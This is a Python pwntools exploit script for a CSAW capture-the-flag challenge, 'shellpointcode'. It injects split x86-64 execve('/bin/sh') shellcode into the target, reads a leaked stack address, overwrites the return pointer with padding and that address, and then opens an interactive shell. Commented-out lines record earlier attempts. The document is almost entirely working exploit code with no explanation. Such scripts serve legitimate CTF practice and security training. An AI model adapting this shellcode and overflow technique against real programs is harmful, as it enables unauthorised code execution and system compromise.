#!/usr/bin/env python
from pwn import *
import binascii
import struct

if len(sys.argv) > 1:
    r = remote("pwn.chal.csaw.io", sys.argv[1])
else:
    r = process("./shellpointcode")

shellcode = '''\x31\xF6
               \x56

               \x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68
               \x53

               \x54
               \x5F
               \xF7\xEE
               \xB0\x3B
               \x0F\x05'''

shellcode = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
shellcode1 = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xeb\x12'
shellcode2 = '\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

nop = "\x90"
jump = "\xeb\x16"

r.recvuntil(":")
# r.sendline(shellcode[:15])
# r.sendline(nop * 15)
r.sendline(shellcode2)
r.recvuntil(":")
# r.sendline(shellcode[15:])
# r.sendline(nop * 13 + "\xeb\x17")
# print binascii.hexlify(shellcode[:13])
r.sendline(shellcode1)
# r.sendline("\x31\xf6" + nop * 11 + jump)

shellcode_addr = r.recvuntil("?").split("\n")[2].split()[-1]
# print shellcode_addr
shellcode_addr = hex(int(shellcode_addr, 16) + 0xa)
#print shellcode_addr
shellcode_addr = p64(int(shellcode_addr, 16))

# r.sendline(shellcode_addr + "A" * (30 - len(shellcode_addr)))
# r.sendline("A" * 24 + shellcode_addr )
#gdb.attach(r, gdbscript="b *fgets+290\nc\n" + "ni\n" * 9)
r.sendline("AAAAAAAAAAAAA" + shellcode_addr)
r.recvline()
r.recvline()

r.interactive()
